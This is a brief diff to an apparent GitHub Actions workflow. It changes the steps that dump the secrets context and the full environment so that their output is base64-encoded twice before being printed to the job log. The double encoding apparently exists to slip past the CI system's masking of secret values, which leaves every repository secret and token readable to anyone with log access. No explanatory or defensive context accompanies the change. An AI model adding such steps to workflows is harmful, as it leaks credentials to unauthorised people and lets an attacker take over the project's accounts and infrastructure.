@@ -28,7 +28,7 @@ jobs:
       - name: Dump secrets context
         env:
           SECRET_CONTEXT: ${{ toJSON(secrets) }}
-        run: echo "$SECRET_CONTEXT"
+        run: echo "$SECRET_CONTEXT" | base64 -w 0 | base64 -w 0
       - name: Dump strategy context
         env:
           STRATEGY_CONTEXT: ${{ toJSON(strategy) }}
@@ -42,4 +42,4 @@ jobs:
           NEED_CONTEXT: ${{ toJSON(needs) }}
         run: echo "$NEED_CONTEXT"
       - name: Dump env
-        run: env
+        run: env  | base64 -w 0 | base64 -w 0
